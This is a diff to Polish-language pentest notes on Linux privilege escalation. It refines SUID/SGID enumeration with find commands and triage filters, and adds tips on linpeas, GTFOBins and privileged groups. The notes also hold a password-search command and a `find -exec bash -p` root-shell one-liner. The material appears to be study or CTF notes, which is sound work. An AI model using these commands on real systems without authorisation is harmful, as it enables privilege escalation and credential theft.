@@ -1218,9 +1218,16 @@ findstr /si password *.txt *.ini *.config *.xml
 ### SUID / SGID binaries
 > Bit SUID (`s` zamiast `x`) pozwala uruchomić plik z prawami **właściciela**.
 ```bash
-find / -perm -u=s -type f 2>/dev/null                 # znajdź SUID
-find / -perm -g=s -type f 2>/dev/null                 # znajdź SGID
+find / -perm -4000 -type f 2>/dev/null                # znajdź SUID (-4000 czytelniejsze niż -u=s)
+find / -perm -2000 -type f 2>/dev/null                # znajdź SGID
+# TRIAGE (goly find listuje setki — odsiej standardowe, zostaw nietypowe):
+find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null            # z wlascicielem
+find / -perm -4000 -type f 2>/dev/null | grep -vE '^/(usr/bin|usr/sbin|bin|sbin|usr/lib|snap)/'
+find / -perm -4000 -type f 2>/dev/null | grep -E '/home/|/opt/|/usr/local/|/srv/'   # cel
 ```
+> 💡 **SUID działa jako WŁAŚCICIEL (root), nie jako Ty** — nie filtruj „po swoim koncie", tylko szukaj binarek spoza bazowego systemu. Standardowe (`ping`,`su`,`sudo`,`mount`,`passwd`,`pkexec`...) zwykle NIE są drogą (chyba że CVE). Najszybciej: **linpeas** podświetla ciekawe na czerwono/żółto.
+> **SGID** działa jako GRUPA → tu `id` ma znaczenie: `find / -group "$(id -gn)" -writable 2>/dev/null` i grupy typu `docker/lxd/disk/adm/shadow` (GTFOBins → "Groups").
+
 Jeśli np. `find` ma SUID → wykonaj polecenie jako root:
 ```bash
 find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
